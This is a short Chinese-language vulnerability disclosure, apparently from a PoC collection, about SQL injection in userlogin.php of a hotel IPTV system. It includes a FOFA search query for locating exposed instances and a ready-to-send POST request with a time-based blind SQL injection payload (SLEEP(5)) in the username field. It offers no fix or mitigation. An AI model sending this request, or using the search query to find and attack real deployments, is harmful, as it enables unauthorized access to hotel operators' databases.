# 酒店智慧营销IPTV系统userlogin.php存在sql注入漏洞

子辰视讯IPTV系统拥有电信级全业务功能，支持电视直播（IGMP组播模式和HLS单播模式同时）、4K超高清、时移回看、内网视频点播、外网OTT点播、桌面定制、应用推送、字幕广告、挂角广告、用户认证计费和到期提醒等。该系统    userlogin.php存在sql注入漏洞,攻击者可利用该漏洞获取系统信息。

## fofa

```javascript
body="xsiptvp"
```

## poc

```javascript
POST /xsiptva/cniptv/userlogin.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 113
Content-Type: application/x-www-form-urlencoded
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36

username=admin' AND (SELECT 6707 FROM (SELECT(SLEEP(5)))mQbf) AND '1'='1&password=admin
```

